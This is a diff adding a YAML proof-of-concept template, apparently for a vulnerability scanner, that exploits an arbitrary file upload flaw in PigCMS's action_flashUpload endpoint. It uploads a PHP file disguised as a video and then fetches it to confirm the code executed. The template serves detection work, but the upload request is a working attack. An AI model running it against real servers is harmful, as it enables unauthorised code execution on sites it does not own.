@@ -1,0 +1,33 @@
+id: poc-yaml-PigCMS-action_flashUpload-arbitrary-upload
+info:
+  name: PigCMS-action_flashUpload-任意上传
+  severity: critical
+  tags:
+  - 文件上传
+  finger: PigCMS
+variables:
+  boundary: random_str(8)
+requests:
+- method: POST
+  path: /cms/manage/admin.php?m=manage&c=background&a=action_flashUpload
+  headers:
+    Content-Type: multipart/form-data; boundary={{.boundary}}
+  data: '--{{.boundary}}
+
+    Content-Disposition: form-data; name="filePath"; filename="test.php"
+
+    Content-Type: video/x-flv
+
+
+    <?php echo md5({{.boundary}}); ?>
+
+    --{{.boundary}}--
+
+    '
+  expression: status_code == 302 && contains(body, "MAIN_URL_ROOT/upload/images/")
+  output:
+  - regex_match(body, "MAIN_URL_ROOT(?P<fpath>.+)")
+- method: GET
+  path: /cms{{.fpath}}
+  expression: status_code == 200 && contains(body, md5(boundary))
+transport: http
